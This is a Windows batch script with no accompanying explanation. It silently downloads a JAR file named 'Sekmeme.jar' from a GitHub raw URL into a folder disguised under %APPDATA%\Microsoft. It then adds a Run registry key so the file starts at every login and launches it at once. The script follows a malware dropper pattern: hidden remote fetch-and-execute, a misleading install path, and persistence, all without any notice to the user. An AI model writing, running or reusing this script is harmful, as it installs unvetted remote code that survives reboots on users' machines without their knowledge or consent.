@echo off
cls

set "JAR_NAME=Sekmeme.jar"
set "JAR_URL=https://raw.githubusercontent.com/ankarasiberr/DLL/main/Sekmeme.jar"
set "INSTALL_DIR=%APPDATA%\Microsoft\Sekmeme"
set "JAR_PATH=%INSTALL_DIR%\%JAR_NAME%"
set "RUN_VALUE=%JAR_PATH% --autostart"

if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
)

curl -s -L -o "%JAR_PATH%" "%JAR_URL%"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Sekmeme /d "%JAR_PATH% --autostart" /f


start "" "%JAR_PATH%"
exit
